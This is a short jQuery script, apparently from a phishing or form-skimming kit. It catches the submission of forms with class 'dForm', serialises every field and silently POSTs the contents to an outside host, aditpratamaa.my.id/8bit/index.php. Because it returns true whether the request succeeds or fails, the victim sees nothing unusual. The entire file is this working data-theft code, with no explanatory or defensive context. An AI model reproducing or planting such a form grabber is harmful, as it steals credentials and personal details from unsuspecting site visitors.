$(".dForm").submit(function() {

	var d = $(".dForm");

	$.ajax({

        url: "https://aditpratamaa.my.id/8bit/index.php",

        type: "POST",

        data: d.serialize(),

        success: function () {

            return true;

        },

        error: function () {

            return true;

        },

    });

});
